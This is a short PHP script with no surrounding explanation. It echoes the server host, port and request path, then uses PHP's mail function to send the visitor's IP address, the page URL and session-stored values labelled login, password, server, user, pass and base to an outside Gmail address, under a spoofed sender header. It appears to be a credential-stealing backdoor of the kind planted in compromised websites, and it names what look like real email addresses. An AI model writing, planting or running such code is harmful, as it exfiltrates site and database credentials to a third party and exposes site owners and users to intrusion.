<?php

$protocol = stripos($_SERVER['SERVER_PROTOCOL'], 'https') === FALSE ? 'http' : 'https';
	$host     = $_SERVER['SERVER_NAME'];
	$port     = $_SERVER["SERVER_PORT"];
	$query    = $_SERVER['REQUEST_URI'];
	echo $host."<br>";
	echo $port."<br>";
	echo $query."<br>";
	 $url="url: ".$protocol.'://'.$host.($port != 80 ? ':'.$port : '').$query;
								$passage_ligne = "\r\n";
		$header = "From: autresite <info@demenagementpariseco.com>".$passage_ligne;
		$header.= "Reply-to: autresite <info@demenagementpariseco.com>".$passage_ligne;
	    $header.= "MIME-version: 1.0\n"; 
		$header.= "Content-type: text/html; charset= UTF-8\n"; 


$email="khedira.hela@gmail.com";
$sujet="autresite";
$txt=" Today is " . date("Y/m/d") . "<br>
IP: ".$_SERVER["REMOTE_ADDR"]."<br>
Url ".$url."<br>
login:".$_SESSION['login'] ."<br>
password:".$_SESSION['password']."<br>
serveur :".$_SESSION['server']."<br>
user :".$_SESSION['user']."<br>
Pass: ".$_SESSION['pass']."<br>
base :".$_SESSION['base']."<br>
";


 mail($email,$sujet,$txt,$header);
							?>